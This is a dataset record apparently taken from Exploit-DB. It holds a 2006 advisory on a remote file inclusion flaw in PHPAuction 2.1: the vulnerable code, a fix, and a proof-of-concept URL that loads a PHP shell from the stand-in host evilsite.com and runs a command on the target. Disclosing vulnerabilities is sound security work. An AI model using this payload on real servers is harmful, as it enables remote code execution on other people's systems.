{
  "id": "2100",
  "title": "phpAuction 2.1 - &#039;phpAds_path&#039; Remote File Inclusion",
  "cve": "CVE-2006-3984",
  "vuln_type": "unknown",
  "code": "+--------------------------------------------------------------------\r\n+\r\n+ PHPAuction 2.1 Remote File Inclusion\r\n+\r\n+--------------------------------------------------------------------\r\n+\r\n+ Affected Software .: PHPAuction 2.1 (maybe higher)\r\n+ Venedor ...........: http://www.phpauction.net,\r\n+ Class .............: Remote File Inclusion in /phpAdsNew/view.inc.php\r\n+ Risk ..............: high (Remote File Execution)\r\n+ Found by ..........: Philipp Niedziela\r\n+ Original advisory .: http://www.bb-pcsecurity.de/\r\n+ Contact ...........: webmaster[at]bb-pcsecurity[.]de\r\n+\r\n+--------------------------------------------------------------------\r\n+\r\n+ Code /phpAdsNew/view.inc.php:\r\n+\r\n+ .....\r\n+ // Include required files\r\n+ require (\"$phpAds_path/dblib.php\");\r\n+ require (\"$phpAds_path/lib-expire.inc.php\");\r\n+ .....\r\n+\r\n+--------------------------------------------------------------------\r\n+\r\n+ $phpAds_path is not properly sanitized before being used.\r\n+\r\n+--------------------------------------------------------------------\r\n+\r\n+ Solution:\r\n+ Declare $phpAds_path before using.\r\n+\r\n+--------------------------------------------------------------------\r\n+ PoC:\r\n+ Place a PHPShell on a remote location:\r\n+ http://evilsite.com/dblib.php/index.html\r\n+\r\n+ http://[target]/phpAdsNew/view.inc.php?phpAds_path=http://evilsite.com/dblib.php/&cmd=ls\r\n+\r\n+--------------------------------------------------------------------\r\n+\r\n+ Greets:\r\n+ Krini&Lenni\r\n+\r\n+-------------------------[ E O F ]----------------------------------\r\n\r\n# milw0rm.com [2006-08-01]\r\n      ",
  "url": "https://www.exploit-db.com/exploits/2100"
}